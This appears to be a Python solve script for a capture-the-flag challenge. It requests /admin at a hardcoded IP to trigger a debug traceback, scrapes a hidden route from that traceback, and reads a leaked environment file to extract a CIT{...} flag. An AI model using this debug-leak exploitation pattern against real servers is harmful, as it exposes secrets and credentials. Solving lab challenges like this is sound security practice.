#!/usr/bin/env -S uv run
# /// script
# dependencies = [
#   "requests>=2.32.0",
# ]
# ///

import re
import sys

import requests


def fail(message: str) -> "NoReturn":
    raise SystemExit(message)


def main() -> None:
    base_url = sys.argv[1] if len(sys.argv) > 1 else "http://23.179.17.92:5002"
    base_url = base_url.rstrip("/")

    session = requests.Session()
    session.trust_env = False

    response = session.get(f"{base_url}/admin", timeout=10)
    if response.status_code != 500:
        fail(f"unexpected /admin response: {response.status_code}")

    routes = re.findall(r"@app\.route\(&#34;([^&]+)&#34;\)", response.text)
    hidden_route = next((route for route in routes if route != "/admin"), None)
    if not hidden_route:
        fail("failed to extract hidden route from debugger traceback")

    response = session.get(f"{base_url}{hidden_route}", timeout=10)
    if response.status_code != 200:
        fail(f"hidden route failed: {response.status_code} {response.text}")

    flag_match = re.search(r"CIT\{[^}]+\}", response.text)
    if not flag_match:
        fail("flag not found in leaked env file")

    print(flag_match.group(0))


if __name__ == "__main__":
    main()
